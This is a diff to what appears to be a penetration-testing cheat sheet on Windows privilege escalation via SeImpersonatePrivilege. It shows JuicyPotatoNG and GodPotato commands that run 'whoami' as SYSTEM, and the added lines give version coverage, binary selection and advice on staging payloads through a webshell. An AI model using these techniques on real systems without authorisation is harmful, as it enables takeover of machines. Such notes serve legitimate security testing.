@@ -15,10 +15,15 @@ What it does: Lets you impersonate system user
 JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami"
 ```
 ### God Potato 
+- Works across Windows 8/8.1–11 and Server 2012–2022 when SeImpersonatePrivilege is present.
+- Grab the binary that matches the installed runtime (e.g., GodPotato-NET4.exe on modern Server 2022).
+- If your initial execution primitive is a webshell/UI with short timeouts, stage the payload as a script and ask GodPotato to run it instead of a long inline command
 
 ```
 GodPotato -cmd "cmd /c whoami"
 ```
+
+
 ### PrintSpoofer
 # SeLoadDriverPrivilege
 
